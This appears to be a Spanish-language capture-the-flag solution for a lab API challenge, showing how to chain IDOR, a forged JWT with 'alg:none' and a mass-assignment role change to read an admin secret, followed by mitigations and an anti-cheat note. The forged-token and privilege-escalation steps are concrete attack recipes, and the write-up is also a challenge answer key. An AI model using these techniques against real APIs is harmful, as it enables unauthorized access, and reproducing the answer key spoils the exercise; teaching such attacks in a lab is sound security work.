# Solución — api-bola-01 · Broken Object Ledger

**Categoría:** api · **Dificultad:** insane · **Vuln central:** cadena BOLA (IDOR) + Mass Assignment + JWT mal validado (`alg: none`).

## Resumen

LedgerX expone tres fallos encadenables. El objetivo es leer
`GET /api/admin/secret`, que requiere `role=admin`. El secreto es la flag.

| # | Vuln | Endpoint | Efecto |
|---|------|----------|--------|
| 1 | JWT `alg:none` aceptado sin firma | `verify_token` | Forjar cualquier claim (`user_id`, `role`) |
| 2 | BOLA / IDOR | `GET /api/users/{id}/notes`, `GET /api/accounts/{id}` | Leer objetos de otros (incl. admin user_id=1) |
| 3 | Mass assignment | `PATCH /api/users/me` | Asignar `role=admin` sobre el propio registro |

## Camino corto (JWT alg=none)

1. Registrarse: `POST /api/register {username,password}` → te dan `user_id`.
2. **BOLA**: leer notas del admin para confirmar el objetivo:
   ```
   GET /api/users/1/notes   (Bearer <cualquier token>)
   -> "...rotar el secreto corporativo en /api/admin/secret"
   ```
3. **Forjar JWT** con `alg:none` y `role:admin`:
   ```
   header  = base64url({"alg":"none","typ":"JWT"})
   payload = base64url({"user_id":1,"role":"admin"})
   token   = header + "." + payload + "."     (firma vacía)
   ```
4. **Leer la flag**:
   ```
   GET /api/admin/secret   (Authorization: Bearer <token forjado>)
   -> {"secret":"HL4{EJEMPLO}"}
   ```

## Camino alternativo (mass assignment)

1. Login normal → token HS256 legítimo de usuario.
2. `PATCH /api/users/me` con body `{"role":"admin"}` → el server vuelca el body
   sin allow-list y te asciende.
3. Reusar/forjar un token admin y leer `/api/admin/secret`.

Exploit completo (ambos caminos): `solution/exploit.py http://<host>:8080`.

## Por qué es INSANE

- No basta una sola vuln: hay que **encadenar** reconocimiento (BOLA) +
  bypass de auth (JWT) o escalada (mass assignment).
- El JWT se ve "firmado" (HS256) y la clave es aleatoria por instancia, así que
  romper la firma es inviable: el truco es notar que `alg:none` se acepta.

## Mitigaciones (didáctico)

- Validar `alg` contra una allow-list fija (nunca aceptar `none`); usar lib JWT.
- Comprobar **propiedad** del objeto en cada acceso (`obj.owner == sub`).
- Schemas de entrada con allow-list (Pydantic con campos explícitos), nunca
  `dict` crudo volcado sobre el modelo de dominio.

## Nota anti-cheat

La flag (`secret` del admin) es **dinámica y única por equipo** (HMAC del
flag-service, `ARCHITECTURE §4`), inyectada por env `FLAG` en esta instancia.
Compartir el método no da puntos: cada equipo explota su propia API para SU
flag. Enviar la flag de otro equipo dispara `cheat_flag_share` (`/whose-flag`).
Además, BOLA, mass assignment y la lectura del secreto emiten eventos SIEM
(`scan_detected` warn/alert) al collector.
